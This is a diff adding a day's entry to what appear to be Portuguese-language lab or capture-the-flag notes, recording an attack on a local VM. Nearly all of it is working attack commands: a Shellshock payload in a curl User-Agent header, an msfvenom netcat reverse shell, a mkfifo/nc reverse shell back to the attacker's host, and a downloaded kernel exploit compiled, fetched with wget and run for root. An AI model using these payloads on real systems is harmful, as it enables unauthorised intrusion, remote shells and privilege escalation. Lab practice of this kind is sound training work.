@@ -898,3 +898,40 @@ Desafio 21 - - </br>
 		chmod +x beco19
 		./beco19
 
+
+
+
+
+<h3>Dia 20 			26/9/2020</h3>
+
+
+
+	*scan
+	
+	*dirb
+		/cgi-bin	/test
+		
+	*curl -H "User-Agent: () { :; }; echo; /bin/ls" http://192.168.100.26/cgi-bin/test -v
+	
+	*msfvenom -p cmd/unix/reverse_netcat lhost=192.168.100.22 lport=443 -f raw
+		#nc -lnvp 443
+		
+	*curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'mkfifo /tmp/vufcuun; nc 192.168.100.22 443 0</tmp/vufcuun | /bin/sh >/tmp/vufcuun 2>&1; rm /tmp/vufcuun'" http://192.168.100.26/cgi-bin/test -v
+	
+	*nc
+		uname -a 
+			#searchsploit ubuntu 3.2
+		
+		#kali: searchsploit -m 33589.c
+			gcc 33589.c -o beco20
+			
+			python3 -m http.server
+			
+			vm: wget http://192.168.100.22:8000/beco20
+				chmod +beco20
+				./beco20
+				#ERRO -> passar argumento -> supported targets -> cat 33589.c
+				./beco20 0
+					
+				#root
+
